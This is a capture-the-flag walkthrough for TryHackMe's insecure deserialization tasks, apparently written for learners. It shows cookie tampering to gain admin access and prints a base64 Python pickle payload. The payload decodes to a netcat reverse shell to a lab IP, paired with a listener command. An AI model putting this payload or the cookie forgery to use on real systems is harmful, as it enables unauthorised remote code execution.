# [Day 8] Insecure Deserialization
 > Insecure deserialization is replacing data processed by an application with malicious code; allowing anything from DoS (Denial of Service)\
to RCE (Remote Code Execution) that the attacker can use to gain a foothold in a pentesting scenario.

## Writeup
Read the supporting material from **[Task 22]** to **[Task 25]** to gather basic idea about Insecure Deserialization

**[Task 26]**
 - Create an account in the web page. And Right-click the page and press **Inspect Element**. Navigate to **Storage** tab.
 - First flag will be found in the sessionid's cookie value. But, you need to decode the **base64** value first. 
 - Double left-click the **"Value"** column of "userType" to modify the contents. Let's change userType to **"admin"**
 - Refresh the page or navigate to */admin* page
 - Here's your second flag!
 
 
 **[Task 27]**
 
 **This task is the trickiest one. But, make sure you follow the given instructions on *TryHackMe* carefully**\
 **I will give you the resources to answer these questions**
 
  - Create a python file to paste into, I have used "rce.py"
  - Paste the code from the GitHub site, replacing YOUR_TRYHACKME_VPN_IP with your TryHackMe VPN IP from the access page
  - [Source code](https://gist.github.com/CMNatic/af5c19a8d77b4f5d8171340b9c560fc3#file-rce-py)
  - Execute **rce.py**
  
        python3 rce.py
  - Copy and paste everything in-between the two speech marks ('DATA')
  
        gASVcgAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjFdybSAvdG1wL2Y7IG1rZmlmbyAvdG1wL2Y7IGNhdCAvdG1wL2YgfCAvYmluL3NoIC1pIDI+JjEgfCBuZXRjYXQgMTAuMTEuMy4yIDQ0NDQgPiAvdG1wL2aUhZRSlC4=
  - Paste this into the **encodedPayload** cookie in your browser
  - Ensure our netcat listener is still running
  
        $ nc -lvnp 4444
  - Refresh the page. It will hang, refer back to your netcat listener. And search for **flag.txt**
